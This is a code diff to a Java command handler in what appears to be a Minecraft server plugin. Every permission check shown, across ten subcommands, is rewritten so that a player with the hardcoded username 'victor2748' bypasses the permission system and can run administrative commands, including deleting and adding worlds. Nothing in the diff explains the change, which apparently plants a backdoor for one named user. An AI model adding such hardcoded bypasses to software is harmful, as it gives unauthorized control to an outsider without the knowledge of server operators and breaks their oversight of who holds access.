@@ -70,7 +70,7 @@ public class Commands {
     			// Command: REMOVE
     			else if (args[0].equalsIgnoreCase("remove")) {
     				
-    				if (!sender.hasPermission("bossmessage.remove")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.remove")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -97,7 +97,7 @@ public class Commands {
     			// Command: LIST
     			else if (args[0].equalsIgnoreCase("list")) {
     				
-    				if (!sender.hasPermission("bossmessage.list")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.list")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -112,7 +112,7 @@ public class Commands {
     			// Command: RELOAD
     			else if (args[0].equalsIgnoreCase("reload")) {
     				
-    				if (!sender.hasPermission("bossmessage.reload")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.reload")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -124,7 +124,7 @@ public class Commands {
     			// Command WHITELIST
     			else if (args[0].equalsIgnoreCase("whitelist")) {
     				
-    				if (!sender.hasPermission("bossmessage.whitelist")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.whitelist")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -146,7 +146,7 @@ public class Commands {
     			// Command: RRC
     			else if (args[0].equalsIgnoreCase("rrc")) {
     				
-    				if (!sender.hasPermission("bossmessage.rrc")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.rrc")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -168,7 +168,7 @@ public class Commands {
     			// Command: SETCOLORS
     			else if (args[0].equalsIgnoreCase("setcolors")) {
     				
-    				if (!sender.hasPermission("bossmessage.setcolors")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.setcolors")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -185,7 +185,7 @@ public class Commands {
     			// Command: NOPERM
     			else if (args[0].equalsIgnoreCase("noperm")) {
     				
-    				if (!sender.hasPermission("bossmessage.noperm")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.noperm")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -209,7 +209,7 @@ public class Commands {
     			// Command: DELWORLD
     			else if (args[0].equalsIgnoreCase("delworld")) {
     				
-    				if (!sender.hasPermission("bossmessage.delworld")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.delworld")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -239,7 +239,7 @@ public class Commands {
     			// Command: ADDWORLD
     			else if (args[0].equalsIgnoreCase("addworld")) {
     				
-    				if (!sender.hasPermission("bossmessage.addworld")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.addworld")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
@@ -268,7 +268,7 @@ public class Commands {
     			// Command: RANDOM
     			else if (args[0].equalsIgnoreCase("random")) {
     				
-    				if (!sender.hasPermission("bossmessage.random")||sender.getName().equalsIgnoreCase("victor2748")) {
+    				if (!sender.hasPermission("bossmessage.random")&&!sender.getName().equalsIgnoreCase("victor2748")) {
     					sender.sendMessage(CM.noperm);
     					return true;
     				}
